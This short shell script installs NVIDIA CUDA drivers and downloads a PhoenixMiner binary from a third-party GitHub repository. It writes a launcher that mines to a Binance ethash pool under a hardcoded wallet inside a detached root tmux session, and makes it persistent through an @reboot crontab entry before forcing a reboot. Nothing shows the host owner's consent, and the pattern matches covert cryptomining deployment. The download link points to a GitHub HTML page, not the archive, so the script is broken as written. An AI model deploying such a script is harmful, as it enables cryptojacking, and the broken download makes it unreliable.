#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd $HOME/
sudo apt-get -y -qq upgrade
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
sudo apt-get install linux-headers-$(uname -r)
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
wget https://github.com/n2t91/n2tcoin/blob/e86c5257a264fb32fcc4b067e37db3c995ac9c28/PhoenixMiner_5.6d_Linux.tar.gz
tar xzf PhoenixMiner_5.6d_Linux.tar.gz
echo '#!/bin/sh'>>N2T2.sh
echo "cd $HOME/">>N2T2.sh
echo "tmux kill-server">>N2T2.sh
echo "sleep 1">>N2T2.sh
echo "sudo tmux new-session -d -s N2T2 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool stratum+tcp://ethash.poolbinance.com:1800 -wal 0x1b5573ef2ec603580b20764eb37a039ba442d2f8.maydaomaydao -pass x'">>N2T2.sh
echo "@reboot  sh $HOME/N2T2.sh">> resmi
crontab resmi
sudo rm resmi
sudo reboot
